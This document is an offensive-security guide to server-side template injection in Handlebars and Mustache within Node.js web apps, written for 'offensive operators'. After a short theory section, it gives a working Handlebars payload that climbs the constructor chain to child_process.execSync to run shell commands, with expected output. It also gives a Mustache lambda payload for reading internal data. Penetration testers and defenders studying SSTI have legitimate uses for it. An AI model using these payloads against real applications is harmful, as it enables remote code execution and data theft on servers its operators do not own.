---
title: Handlebars & Mustache Template Exploitation Guide
description: Learn to exploit Handlebars and Mustache for code execution and data
  access in Node.js web apps.
keywords:
- Handlebars exploitation
- Mustache injection
- Node.js template engine
- code execution
- SSTI vulnerabilities
---

# Handlebars/Mustache Exploitation

## Context

The purpose of this article is to enable offensive operators to exploit Handlebars and Mustache template engines for code execution or sensitive data access in Node.js web applications. It assumes the reader is familiar with general template engine concepts, understands the JavaScript execution context, and has a basic knowledge of the Node.js environment as well as Server-Side Template Injection (SSTI) fundamentals.

## Theory

### Handlebars and Mustache Template Engine Mechanics

Handlebars and Mustache are widely used JavaScript-based template engines that are employed in Node.js web applications. These engines allow for `logic-less` templates, which interpolate user-supplied data into server-rendered HTML. However, this interpolation process can become a vulnerability when attacker-controlled expressions are rendered by the server.

When untrusted input is processed within these templates, it may be executed through arbitrary helpers or expressions, turning into a possible avenue for exploitation. The injection flaw emerges, specifically, when security configurations are lax, allowing users to manipulate the behavior of the templates through special constructs in user-controllable input fields.

### Handlebars Injection Vectors and Helper Abuse

The primary injection vector in Handlebars involves embedding Handlebars expressions such as `{{expression}}` into fields that are rendered by the server. The potential for exploitation is heightened with custom helpers or when the configuration carelessly permits access to sensitive prototypes.

Attackers can bypass traditional sanitization mechanisms by embedding nested helpers or encoding payloads. These methods allow attackers to insert crafted expressions that take advantage of the template rendering logic and even execute arbitrary JavaScript.

### Mustache Injection and Lambda Exploitation

In Mustache, an attacker might inject Mustache tags like `{{tag}}` or leverage lambda functions, which can potentially lead to JavaScript execution. Improperly handled lambdas or custom tags can expose JavaScript execution primitives, especially when these constructs manipulate or expose sensitive server-side data during rendering.

### Node.js Security Implications

Successful template injection can escalate to arbitrary JavaScript execution within the Node.js process. This alarming potential means that an attacker may achieve remote code execution, access sensitive data, or entirely compromise the process hosting the application. Such exploits spotlight the need for vigilant security practices to counter these injection vulnerabilities effectively.

## Practice

### Handlebars Prototype Pollution and Arbitrary Code Execution

To achieve arbitrary code execution through Handlebars, an attacker must inject the following payload:

```handlebars
{{#with "s" as |string|}}{{#with string.constructor as |cons|}}{{#with cons.constructor as |c|}}{{c('return global.process.mainModule.require("child_process").execSync("id")')()}}{{/with}}{{/with}}{{/with}}
```

- Inject the payload in a user-controllable field such as a comment section or user profile name that reflects input through Handlebars.
- Submit the payload to the application and check for command execution via reflected output.

Expected outcome:

```text
uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)
```

This output indicates successful execution of the `id` command, thereby confirming arbitrary command execution in the Node.js server context.

### Mustache Lambda Injection for Sensitive Data Access

With Mustache, a security weakness may be exploited using the following payload:

```handlebars
{{#lambda}}{{#this}}{{/this}}{{/lambda}}
```

- Place the payload into a user-controllable field processed by Mustache that supports lambda functions.
- Successful execution relies on the applicationâ€™s internal lambdas, potentially allowing access to sensitive data.

Expected outcome:

```text
Sensitive data or internal variable values displayed in rendered output.
```

This indicates that sensitive data or internal variables have been accessed via lambda exploitation.

## Tools

- **tplmap**
- **Burp Suite**
- **curl**